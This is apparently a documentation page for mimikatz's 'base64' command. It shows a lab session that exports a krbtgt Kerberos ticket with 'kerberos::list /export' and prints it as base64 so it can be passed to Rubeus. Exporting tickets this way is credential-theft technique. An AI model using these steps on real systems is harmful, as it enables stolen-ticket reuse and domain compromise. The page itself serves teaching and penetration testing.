# base64

It switches file input/output to base64. It has the following command line arguments:

* `/in`: True or False for base64 input. It can be used with `dpapi::blob /in:<base64_input>`
* `/out`: True or False. Kerberos tickets can be exported to based64 and passed to other tools like Rubeus.

```
mimikatz # base64 /out:true
iSBaSE64InTeRcePTInPut  is false
iSBaSE64INteRcePToUtput is true
```

```
mimikatz # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 13/10/2021 20:58:08 ; 14/10/2021 06:58:08 ; 20/10/2021 20:58:08
   Server Name       : krbtgt/HACKLAB.LOCAL @ HACKLAB.LOCAL
   Client Name       : m3g9tr0n @ HACKLAB.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
====================
Base64 of file : 0-40e10000-m3g9tr0n@krbtgt~HACKLAB.LOCAL-HACKLAB.LOCAL.kirbi
====================
doIFODCCBTSgAwIBBaEDAgEWooIEOjCCBDZhggQyMIIELqADAgEFoQ8bDUhBQ0tM
QUIuTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDUhBQ0tMQUIuTE9DQUyjggPw
MIID7KADAgESoQMCAQKiggPeBIID2o/uKZIOzmU7svKpscKWVvRMS//yUHU+D1ED
2nosZ2EijJDksj0fyfjtM0A31Uakv92+aS9Kjh5lVR90Z9/gCs0BYwyDXeii2yF/
NMTjizz6V52MWtN3icleGGqjF3n/r30Vmss+0k2O4YPfxO+ojYqWbZDk44ppuq5G
ejyy8FAw/xn2bcPbQ+Ciq02dXUZVFMyx7OTBwo2FnlR+GBbQ66rYXPXYXiU5DOs5
FRefdmgAVAjbn9KFXaBySfBjwOTcOQnlpdgFpr6F2LYfBF7oDttQ7yLrvGAx3XLl
pgb1f9W5WlGUmKSJA3gpe6ASCcsnz3OuJEjJj14xxW+m96UcF3nx+gKl4Ol4IXl/
ydptUtncNzyhik+kYn0N14+pDtnLGasvknL+/+cQQ4qLF8lvRil27AbXN2aRg/I1
0otSM8dseDq3gfs4oUAr0qasmUZNENo3ZVUOWwPTV7Ta160Lx4dHBuY9z7TmHw98
s3pluzxkOrCeyVqXksOqGMzvsnzPnXyUmsdlG1qPshrtogKOyIX7SLK4s36zssy+
CZ6ti2nwYpujJcP5pvbI0q5iTgL/IE1UxN4IFEg17XD3mp04AoiBtnbymKTTKTxG
rfEMQHBqhAiGgaBrlzLZWeiQS603EiYuXGn8UPbuduaKX56suP0xNy3epfu0YIBD
5Bsez3lisQv6OKN8ua1GCdHxLrgCUMVQY94EMPmcxOAT37Yc8vb/zshFvXcLOhLn
rvA3BhLQ56hZpdijlVLeJ4AG3bE+Ugpls/jUGxu3lTEhPHrC3AKtm4H1qHLCbbNx
gnw3kP2/wHdpIEsfvSn143xFlGPJRoVbmKP67hfMsdamkYIqdGxt9MFuvnOoYjIl
RmI3MUzdBD7TtA8wBH0Uv8M1Z6veWjVg4A4DdcDXMs4ctQl2GAoiwHBU7JXqndzf
GGX+aR+Sm+s2N+beuUUZPiajmVDc2TKFGhYT6+anpImWX5pZdXOa7QZ66+UkmsQF
XAZ8WisHozVKhh3YjJwrUhq+ZcQsKwD3MJoca05S+YKKL5k9Rq2/4Uo0mpHm9VZl
9Ri/uOpTBmI3gBzjY4XNMUMOVOzR3Jab5XAo6Q2YEmxLAs8nxB1XMxinNWNAigkK
OZKIH5A15c3bfdDqhsLwKDNSyXIOlDFtv1YQeLrJm/c0CQlupZ795y7eLO51TyzT
h58EwZy/xAuK+JB664gMRjZHDF5lpUzo5wZ8HVnXpGrKlSAGpUnNVyGAzwSQeLkH
7XR64bPlO7npLMJqQQcuhpRhga5NrCBEPnlXGh8lvJvhwhx6YupMHXhDCnXDCv9S
o4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAChDxsNSEFDS0xBQi5MT0NBTKIV
MBOgAwIBAaEMMAobCG0zZzl0cjBuowcDBQBA4QAApREYDzIwMjExMDEzMTk1ODA4
WqYRGA8yMDIxMTAxNDA1NTgwOFqnERgPMjAyMTEwMjAxOTU4MDhaqA8bDUhBQ0tM
QUIuTE9DQUypIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDUhBQ0tMQUIuTE9DQUw=

...Output Omitted...
```

```
mimikatz # base64 /out:false
iSBaSE64InTeRcePTInPut  is false
iSBaSE64INteRcePToUtput is false
```
